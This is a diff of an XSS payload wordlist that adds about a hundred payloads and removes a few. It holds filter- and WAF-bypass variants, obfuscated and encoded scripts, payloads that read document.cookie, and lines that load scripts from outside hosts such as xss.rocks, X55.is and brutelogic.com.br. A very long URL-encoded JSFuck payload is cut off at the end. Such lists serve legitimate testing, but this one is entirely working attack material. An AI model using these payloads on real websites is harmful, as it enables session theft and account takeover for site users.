 %3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E
 #<img src=1 onerror=alert(1)>
-<a/href=javascript&colon;alert()>click
 <body onload="eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))">
-<a href="javascript&#0000058&#0000097lert('Successful XSS')">Click this link!</a>
 <iframe src=# onmouseover=alert(String.fromCharCode(88,83,83))></iframe>
 <img src="java    script:al ert('Successful XSS')">
 <img src="java	script:al	ert('Successful XSS')">
-<a href="  &#x8; &#23;   javascript:alert('Successful XSS')">Click this link!</a>
 <scr<script>ipt>document.write("Successful XSS")</scr<script>ipt>
 <img/src="funny.jpg"onload=javascript:eval(alert('Successful&#32XSS'))>
-<a href='vbscript:MsgBox("Successful XSS")'>Click here</a>
 <img dynsrc="javascript:alert('Successful XSS')">
 <img src=`javascript:alert("The name is 'XSS'")`>
 <body background="javascript:alert('Successful XSS')">
@@ -173,10 +681,115 @@ fileName=')},1000);alert("XSS`);//
 <body onactivate=alert(1)>
 <body onfocusin=alert(1)>
 <div style="background-image:url(javascript:alert('Successful XSS'))">
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<input type=image src onerror="prompt(1)">
+<svg onload=alert(1)//
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src='1' onerror='alert(0)' <
+<script>window['alert'](document['domain'])</script>
+<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
+<script x> alert(1) </script 1=2
+<script x>alert('XSS')<script y>
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+<svg////////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~>
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert('1'&#41</x>
+<iframe src=""/srcdoc='<svg onload=alert(1)>'>
+<svg><animate onbegin=alert() attributeName=x></svg>
+<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
+<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
+";a=prompt,a()//
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+\'/alert(1)//
+\'}alert(1);{//
+\;alert(1)//
+\\;alert(1)//
+\’-alert(1)//
+\’-alert(1)};{//
+\’}alert(1);{//
+\”;alert(1);//
+‘)alert(1);//
+javascript:alert(1)
+<Svg Only=1 OnLoad=confirm(document.domain)>
+<Svg/OnLoad=alert(1337)>"@gmail.com
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+<svg onload=alert&#0000000040document.cookie)>
+<svg onload=alert&#0000000040"1")><””>
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+%3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
+%3Csvg%20onload=alert(%22MrHex88%22)%3E
+%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
+"><svg onmouseover="confirm&#0000000040document.domain)
+<Img Src=OnXSS OnError=confirm(1337)>
+'%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
+<Script>window.valueOf=alert;window%2B1</Script>
+<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
+1%22onfocus=%27alert%28document.cookie%29%27%20autofocus=
+"><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)> 
+- 1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")
+'"><img src=x onerror=alert("xss!")>.pdf
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+"><track/onerror='confirm`1`'>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+<img/src=x onError="`${x}`;alert(`Hello`);">
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+/alert(1)}//\
+<svg/onload=location=‘javas’%2B‘cript:’%2B
+‘ale’%2B‘rt’%2Blocation.hash.substr(1)>#(1)
+"'`//><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE"))>
+<SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>
+';k='e'%0Atop['al'+k+'rt'](1)//
+"';k='e'%0Atop['al'+k+'rt'](1)//"
+*/alert(1)/*
+/alert(1)//\
+<img/src/onerror=alert/1337/(1)>
+<img/src/onerror=alert//&NewLine;(2)>
+<img/src/onerror=alert&sol;&sol;(3)>
+'"/><script%20>alert(document.domain)<%2fscript>.css
+<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
+/path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
+login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//
+"><iframe%20src="http://google.com"%%203E
+"><img src=1 onerror=alert(1)>.gif
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+"><img src=x onerror=prompt(1);>
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+"><script src=//brutelogic.com.br&sol;1.js&num;
+"><script src=data:&comma;alert(1)//
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"><svg onload=alert(1)//
+"><svg/onload=alert(/XSS/)
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=alert(1)/**/(import(/https:\\X55.is?1=18369/.source))//>
+"`'><script>-javascript:alert(1)</script>
+"`'><script>\x00javascript:alert(1)</script>
 <input type="image" src="javascript:alert('Successful XSS')">
 %26%23x2f%3B%26%23x2f%3Br4y.pw
-<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
-<d3v/onauxclick=(((confirm)))``>click
 "/><iMg SrC="x" oNeRRor="alert(document.cookie);">
 svg/onload=alert(document.cookie)abcdef@test.com
 <img src="non-existent-image.jpg" onerror="alert(document.cookie);" />
@@ -185,7 +798,6 @@ svg/onload=alert(document.cookie)abcdef@test.com
 %26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B
 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
 %26amp%3Blt%3Bscript%26amp%3Bgt%3Balert%281%29%26amp%3Blt%3B%2Fscript%26amp%3Bgt%3B
-<d3v/onmouseleave=[2].some(confirm)>click
 <details/open/ontoggle=alert()>
 <details/open/ontoggle=(confirm)()//
 ";[][“\146\151\154\164\145\162”][“\143\157\156\163\164\162\165\143\164\157\162”](“\145\166\141\154\50\141\164\157\142\50\42\131\127\170\154\143\156\121\157\115\123\153\75\42\51\51”)();var+test="
@@ -208,7 +820,6 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 <DIV STYLE="width: expression(alert('XSS'));">
 <BASE HREF="javascript:alert('XSS');//">
-<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
 <?php echo('<SCR'); echo('IPT>alert("XSS")</SCRIPT>'); ?>
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 /\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
@@ -217,12 +828,9 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
 "><img src=1 onmouseleave=print()>
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%5B%5D%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%21%5B%5D%5D%2B%5B%5D%5B%5B%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%28%29%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%